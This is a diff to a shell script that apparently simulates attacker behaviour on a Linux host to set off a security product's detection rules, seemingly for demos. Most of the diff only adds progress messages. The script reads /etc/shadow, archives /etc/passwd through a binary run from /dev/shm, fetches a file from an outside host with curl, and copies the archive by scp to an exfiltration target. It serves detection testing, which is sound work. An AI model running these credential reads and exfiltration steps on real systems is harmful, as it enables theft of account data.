@@ -48,11 +48,13 @@ if [ "${#missing[@]}" -gt 0 ]; then
 fi
 
 # Generate some random noise for the Event Analyzer view
-/bin/echo "Generating some random noise for the Event Analyzer view"
+/bin/echo -n "Generating some random noise for the Event Analyzer view..."
 /usr/bin/whoami &>/dev/null
 /usr/bin/ls &>/dev/null
+printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Account Discovery alerts
+/bin/echo -n "Triggering Account Discovery alerts..."
 for i in {1..3}; do
   /usr/bin/groups &>/dev/null
   /usr/bin/getent passwd &>/dev/null
@@ -60,23 +62,27 @@ for i in {1..3}; do
   sudo /bin/cat /etc/shadow &>/dev/null
   sleep 3
 done
+printf '\033[1;32mDone\033[0m\n'
 
 # Copy C programs over and execute
-/bin/echo "Copying binaries over and executing"
+/bin/echo -n "Copying binaries over and executing..."
 /usr/bin/cp -p $TARGET_HOST_ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
 /usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
 sudo /dev/shm/nothing_to_see_here -c "/usr/bin/tar czPf $FILE /etc/passwd" &>/dev/null
+printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Inidcator Match Detection Rules
-/bin/echo "Triggering Indicator Match Detection Rules"
+/bin/echo -n "Triggering Indicator Match Detection Rules..."
 /usr/bin/curl http://x.com/dlr.ppc &>/dev/null
+printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Malware alert with EICAR file
-/bin/echo "Triggering Malware alert with EICAR file"
+/bin/echo -n "Triggering Malware alert with EICAR file..."
 /usr/bin/tar xf $TARGET_HOST_ROOTDIR/files/eicar_com.tar.gz &>/dev/null
+printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Linux system info discovery rule
-/bin/echo "Triggering Linux system info discovery rule"
+/bin/echo -n "Triggering Linux system info discovery rule..."
 for i in {1..4}; do
   /usr/bin/uname -r &>/dev/null
   /usr/bin/uname -o &>/dev/null
@@ -86,11 +92,13 @@ for i in {1..4}; do
   /usr/bin/uname -n &>/dev/null
   sleep 4
 done
+printf '\033[1;32mDone\033[0m\n'
 
 if [ -f "$FILE" ]; then
-  /bin/echo "Copying $FILE to $EXFILL_TARGET"
+  /bin/echo -n "Copying $FILE to $EXFILL_TARGET..."
   /usr/bin/scp -i $EXFILL_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/  
 fi
+printf '\033[1;32mDone\033[0m\n'
 
 #######################
 ##      CLEANUP      ##
@@ -99,8 +107,9 @@ fi
 # You can show this in the Event Analyzer, and then show the process still running
 # in memory with OSquery
 if [ $? -eq 0 ]; then
-  /bin/echo "Removing files from /dev/shm"
+  /bin/echo -n "Removing files from /dev/shm..."
   sudo /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} $FILE &>/dev/null
 fi 
+printf '\033[1;32mDone\033[0m\n'
 
 exit
